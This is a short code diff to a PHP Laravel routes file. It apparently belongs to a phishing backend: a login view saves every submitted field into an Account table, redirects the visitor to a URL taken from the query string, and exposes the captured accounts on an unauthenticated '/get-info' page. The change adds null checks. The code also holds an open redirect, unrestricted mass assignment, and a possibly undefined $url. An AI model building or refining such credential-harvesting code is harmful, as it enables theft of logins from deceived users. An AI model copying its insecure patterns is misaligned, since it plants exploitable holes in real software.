@@ -14,11 +14,13 @@ use App\Account;
  */
 
 Route::get('/', function () {
-    $parameters = request()->query();
+    if (request()->query()) {
+        $parameters = request()->query();
 
-    $url = $parameters['url'];
+        $url = $parameters['url'];
 
-    session(['url' => $url]);
+        session(['url' => $url]);
+    }
 
     return view('login');
 
@@ -27,13 +29,15 @@ Route::get('/', function () {
 Route::post('', function () {
     Account::create(request()->all());
 
-    $url = session('url');
+    if (session('url')) {
+        $url = session('url');
+    }
 
     return redirect($url);
 });
 
 Route::get('/get-info', function () {
-    $accounts = Account::latest()->groupBy('email')->paginate(30);
+    $accounts = Account::latest()->paginate(30);
 
     return view('accounts', compact('accounts'));
 });
